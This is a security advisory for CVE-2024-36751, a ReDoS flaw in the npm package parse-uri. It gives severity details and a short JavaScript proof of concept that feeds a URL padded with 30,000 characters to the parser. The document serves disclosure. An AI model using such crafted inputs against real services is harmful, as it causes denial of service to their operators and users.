# [M] parse-uri Regular expression Denial of Service (ReDoS)

## Summary
Severity: Medium
Advisory: GHSA-6fx8-h7jm-663j
CVE: CVE-2024-36751
CWE: CWE-1333, CWE-185
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-01-16
Source: https://github.com/advisories/GHSA-6fx8-h7jm-663j
Type: github-advisory

## Affected
- npm: `parse-uri` — affected >=0
- npm: `parseuri` — affected >=0

## Details
An issue in parse-uri v1.0.9 allows attackers to cause a Regular expression Denial of Service (ReDoS) via a crafted URL.
 ## PoC
```js
async function exploit() {
    const parseuri = require("parse-uri");
    // This input is designed to cause excessive backtracking in the regex
    const craftedInput = 'http://example.com/' + 'a'.repeat(30000) + '?key=value';
    const result = await parseuri(craftedInput);
    }
await exploit();
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2024-36751
- https://github.com/Kikobeats/parse-uri/issues/14
- https://gist.github.com/6en6ar/78168687da94e8aa2e0357f2456b0233
